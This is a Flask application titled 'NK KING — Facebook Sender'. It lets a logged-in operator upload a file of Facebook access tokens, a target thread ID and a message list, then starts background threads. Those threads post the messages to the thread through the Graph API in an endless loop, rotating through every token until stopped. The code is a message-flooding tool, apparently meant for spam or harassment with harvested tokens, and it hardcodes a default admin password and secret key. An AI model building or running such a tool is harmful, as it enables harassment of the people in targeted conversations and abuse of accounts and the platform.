# app.py
from flask import Flask, request, render_template_string, redirect, url_for, session, jsonify
from functools import wraps
import os, time, random, string, threading, requests, io

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET", "change_this_random_string")

# Config from env (set on Render)
ADMIN_USERNAME = os.environ.get("ADMIN_USER", "NK KING GREE CEL")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "NK@123")
CONTACT_NUMBER = os.environ.get("CONTACT_NUMBER", "9694912650")

# In-memory task management
tasks = {}       # task_id -> dict { thread, stop_event, logs(list), meta... }
MAX_LOGS = 300

def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if session.get("logged_in"):
            return f(*args, **kwargs)
        return redirect(url_for("login", next=request.path))
    return wrapper

# --- logging helper
def push_task_log(task, text):
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{ts}] {text}"
    task["logs"].insert(0, entry)
    if len(task["logs"]) > MAX_LOGS:
        task["logs"].pop()

# ---------- Login / Logout / UI ----------
LOGIN_HTML = """<!doctype html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>NK KING — Login</title>
<style>body{background:#000;color:#0f0;font-family:Inter,system-ui;display:flex;align-items:center;justify-content:center;height:100vh;margin:0} .box{background:rgba(0,10,0,0.6);padding:28px;border-radius:12px;border:1px solid rgba(0,255,0,0.12);width:360px} label{display:block;margin-top:10px;color:#9fffcf} input{width:100%;padding:10px;border-radius:8px;border:1px solid rgba(0,255,0,0.08);background:#001200;color:#dfffe6} .btn{margin-top:12px;background:linear-gradient(90deg,#00ff66,#00cc44);border:none;padding:10px;border-radius:8px;font-weight:700;color:#000;width:100%} .err{color:#ff6b6b;margin-bottom:8px} .note{font-size:12px;color:#9fffcf;margin-top:10px}</style></head>
<body>
  <div class="box">
    <h2>💀 NK KING — Login</h2>
    {% if error %}<div class="err">{{ error }}</div>{% endif %}
    <form method="post">
      <label>Username</label>
      <input type="text" name="username" value="{{ username }}" required autofocus />
      <label>Password</label>
      <input type="password" name="password" required />
      <button class="btn" type="submit">Enter</button>
    </form>
    <div class="note">Contact: {{ contact }}</div>
  </div>
</body></html>
"""

MAIN_HTML = """<!doctype html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>NK KING — Facebook Sender</title>
<style>body{font-family:Inter,system-ui;background:radial-gradient(circle at top,#001000 0%,#000 100%);color:#00ff66;margin:0;padding:18px} .wrap{max-width:980px;margin:0 auto} header{display:flex;justify-content:space-between;align-items:center} h1{margin:0;font-size:26px;text-shadow:0 0 18px #00ff6a} .card{background:rgba(0,20,0,0.35);padding:18px;border-radius:10px;margin-top:12px;border:1px solid rgba(0,255,0,0.08)} label{display:block;margin-top:8px;color:#9fffcf} input,select,textarea{width:100%;padding:10px;border-radius:8px;border:1px solid rgba(0,255,0,0.06);background:#001200;color:#dfffe6} .btn{background:linear-gradient(90deg,#00ff77,#00cc55);border:none;padding:10px;border-radius:8px;font-weight:700;color:#000;cursor:pointer} .btn.secondary{background:#002200;color:#00ff77;border:1px solid #00ff55} .logs{background:#000;color:#00ff55;padding:10px;border-radius:8px;height:180px;overflow:auto;font-family:monospace;border:1px solid rgba(0,255,0,0.06)} footer{margin-top:20px;text-align:center;color:#aaffc8;padding-top:12px;border-top:1px solid rgba(0,255,0,0.06)} .small{font-size:13px;color:#bfffdc} .row{display:flex;gap:12px;flex-wrap:wrap}.col{flex:1;min-width:220px}</style>
</head><body>
<div class="wrap">
  <header><h1>💚 NK KING — Facebook Sender</h1><div>Welcome, <strong>{{ username }}</strong> &nbsp; <a href="/logout" style="color:#000;background:#00ff77;padding:8px 10px;border-radius:8px;text-decoration:none">Logout</a></div></header>

  <div class="card">
    <h3>Start Sending (Background)</h3>
    <form id="startForm" method="post" action="/start" enctype="multipart/form-data">
      <div class="row">
        <div class="col">
          <label>Select Token Option</label>
          <select name="tokenOption" id="tokenOption" onchange="toggleTokenOption()">
            <option value="single">Single Token</option>
            <option value="multiple">Token File</option>
          </select>
          <div id="singleTokenInput"><label>Enter Single Access Token</label><input name="singleToken" placeholder="EAA..."/></div>
          <div id="tokenFileInput" style="display:none"><label>Upload Token File (.txt)</label><input type="file" name="tokenFile" accept=".txt" /></div>
        </div>
        <div class="col">
          <label>Enter Thread/Convo ID</label><input name="threadId" placeholder="t_1234567890"/>
          <label>Prefix (bot name)</label><input name="prefix" placeholder="NK BOT"/>
          <label>Delay between messages (seconds)</label><input name="time" value="5" type="number" min="1"/>
        </div>
      </div>

      <label>Upload messages file (.txt) — one message per line</label>
      <input type="file" name="txtFile" accept=".txt" required />

      <div style="margin-top:10px;display:flex;gap:8px;">
        <button class="btn" type="submit">🚀 Start</button>
        <button class="btn secondary" type="button" onclick="openStop()">Stop Task</button>
      </div>
    </form>
  </div>

  <div class="card">
    <h3>Active Tasks & Logs</h3>
    <div style="display:flex;gap:12px;flex-wrap:wrap">
      <div style="flex:1;min-width:260px">
        <label>Active Tasks (ID : meta)</label>
        <div class="logs" id="tasksBox">Loading...</div>
      </div>
      <div style="flex:1;min-width:260px">
        <label>Recent Logs (selected task)</label>
        <div class="logs" id="logsBox">Select a task to view logs</div>
      </div>
    </div>
  </div>

  <div class="card small">
    <strong>How it works:</strong> When you press Start, the server spawns a background thread that sends each line from the uploaded .txt to the provided thread ID using the provided tokens. A stop key will be returned by the API — use it to stop the task.
  </div>

  <footer>
    📞 Contact: <strong>{{ contact }}</strong><div style="font-size:12px;color:#99ffb8;margin-top:6px">Powered by NK KING</div>
  </footer>
</div>

<script>
function toggleTokenOption(){
  var v=document.getElementById('tokenOption').value;
  document.getElementById('singleTokenInput').style.display = v==='single'?'block':'none';
  document.getElementById('tokenFileInput').style.display = v==='multiple'?'block':'none';
}
async function refreshTasks(){
  let r=await fetch('/tasks'); let j=await r.json();
  if(!j.ok){ document.getElementById('tasksBox').innerText='No tasks'; return; }
  const arr=j.tasks;
  if(arr.length===0){ document.getElementById('tasksBox').innerText='No active tasks'; } else {
    document.getElementById('tasksBox').innerHTML = arr.map(t => `<div><a href="#" onclick="selectTask('${t.id}')">${t.id}</a> • ${t.meta}</div>`).join('');
  }
}
async function selectTask(id){
  let r=await fetch('/task/'+id); let j=await r.json();
  if(!j.ok){ document.getElementById('logsBox').innerText='Not found'; return; }
  document.getElementById('logsBox').innerText = j.logs.join('\\n');
}
async function openStop(){
  let key = prompt('Enter stop key for the task to stop'); if(!key) return;
  let r = await fetch('/stop',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({stopKey:key})});
  let j=await r.json(); alert(JSON.stringify(j));
  refreshTasks();
}
setInterval(refreshTasks,4000);
refreshTasks();
</script>
</body></html>
"""

@app.route("/login", methods=["GET","POST"])
def login():
    next_url = request.args.get("next") or url_for("index")
    if request.method == "POST":
        u = request.form.get("username","").strip()
        p = request.form.get("password","").strip()
        if u == ADMIN_USERNAME and p == ADMIN_PASSWORD:
            session["logged_in"] = True
            session["username"] = u
            return redirect(next_url)
        return render_template_string(LOGIN_HTML, error="Invalid credentials", username=u, contact=CONTACT_NUMBER)
    return render_template_string(LOGIN_HTML, error=None, username="", contact=CONTACT_NUMBER)

@app.route("/logout")
@login_required
def logout():
    session.clear()
    return redirect(url_for("login"))

@app.route("/")
@login_required
def index():
    return render_template_string(MAIN_HTML, username=session.get("username",""), contact=CONTACT_NUMBER)

@app.route("/healthz")
def healthz():
    return jsonify({"ok":True,"status":"running"})

# ------------------ Task API ------------------
@app.route("/start", methods=["POST"])
@login_required
def start_task():
    try:
        tokenOption = request.form.get("tokenOption")
        tokens = []
        if tokenOption == "single":
            t = (request.form.get("singleToken") or "").strip()
            if t: tokens = [t]
        else:
            if "tokenFile" not in request.files:
                return jsonify({"ok":False,"error":"tokenFile missing"}),400
            raw = request.files["tokenFile"].read().decode("utf-8",errors="ignore").strip().splitlines()
            tokens = [x.strip() for x in raw if x.strip()]
        if not tokens:
            return jsonify({"ok":False,"error":"no tokens provided"}),400

        threadId = request.form.get("threadId","").strip()
        prefix = request.form.get("prefix","").strip()
        delay_s = float(request.form.get("time","5") or 5.0)

        if "txtFile" not in request.files:
            return jsonify({"ok":False,"error":"txtFile missing"}),400
        text_lines = request.files["txtFile"].read().decode("utf-8",errors="ignore").splitlines()
        messages = [l.strip() for l in text_lines if l.strip()]
        if not messages:
            return jsonify({"ok":False,"error":"no messages in file"}),400

        # build meta
        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        stop_event = threading.Event()
        task = {"id":task_id, "stop_event":stop_event, "logs":[], "meta":f"to={threadId} tokens={len(tokens)} delay={delay_s}s"}
        tasks[task_id] = task

        def worker():
            push_task_log(task, "Worker started")
            i = 0
            while not stop_event.is_set():
                msg = messages[i % len(messages)]
                full_msg = (f"[{prefix}] " if prefix else "") + msg
                for token in tokens:
                    if stop_event.is_set(): break
                    try:
                        api_url = f"https://graph.facebook.com/v20.0/t_{threadId}/"
                        params = {"access_token": token, "message": full_msg}
                        r = requests.post(api_url, data=params, timeout=25)
                        if r.status_code == 200:
                            push_task_log(task, f"Sent via token[:6]={token[:6]} -> {full_msg}")
                        else:
                            push_task_log(task, f"Fail({r.status_code}) token[:6]={token[:6]} -> {r.text[:150]}")
                    except Exception as e:
                        push_task_log(task, f"Exception sending: {str(e)[:150]}")
                    time.sleep(0.2)  # small gap between tokens
                i += 1
                # sleep between message cycles
                for _ in range(int(max(1, delay_s))):
                    if stop_event.is_set(): break
                    time.sleep(1)
            push_task_log(task, "Worker stopped")
            # clean up: leave task entry (we keep it for a while)
        t = threading.Thread(target=worker, daemon=True)
        task["thread"] = t
        t.start()

        # generate stopKey and save
        stopKey = ''.join(random.choices(string.ascii_lowercase+string.digits, k=8))
        task["stopKey"] = stopKey
        push_task_log(task, f"Task created ID={task_id} stopKey={stopKey}")

        return jsonify({"ok":True, "task_id":task_id, "stopKey":stopKey})
    except Exception as e:
        return jsonify({"ok":False, "error":str(e)}),500

@app.route("/stop", methods=["POST"])
@login_required
def stop_task():
    data = request.get_json() or {}
    stopKey = data.get("stopKey") or data.get("stopKey".lower())
    if not stopKey:
        return jsonify({"ok":False,"error":"stopKey required"}),400
    # find task with this key
    for tid, task in list(tasks.items()):
        if task.get("stopKey") == stopKey and not task["stop_event"].is_set():
            task["stop_event"].set()
            push_task_log(task, "Stop requested via API")
            return jsonify({"ok":True,"msg":"stop requested","task_id":tid})
    return jsonify({"ok":False,"error":"no matching running task"}),404

@app.route("/tasks")
@login_required
def list_tasks():
    out = []
    for tid, task in tasks.items():
        meta = task.get("meta","")
        status = "running" if not task["stop_event"].is_set() and task.get("thread") and task["thread"].is_alive() else "stopped"
        out.append({"id":tid,"meta":meta,"status":status})
    return jsonify({"ok":True,"tasks":sorted(out, key=lambda x:x["id"], reverse=True)})

@app.route("/task/<task_id>")
@login_required
def get_task(task_id):
    task = tasks.get(task_id)
    if not task:
        return jsonify({"ok":False,"error":"not found"}),404
    return jsonify({"ok":True,"id":task_id,"logs":task["logs"], "meta":task.get("meta")})

# Optionally clear old stopped tasks periodically to avoid memory growth
def cleanup_worker():
    while True:
        now = time.time()
        for tid in list(tasks.keys()):
            t = tasks[tid]
            # remove if stopped for more than 1 hour
            if t["stop_event"].is_set():
                # find last log entry time approx not stored; we simply keep for 1 hour by creation check omitted for simplicity
                pass
        time.sleep(3600)

cleanup_thread = threading.Thread(target=cleanup_worker, daemon=True)
cleanup_thread.start()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5040))
    app.run(host="0.0.0.0", port=port)
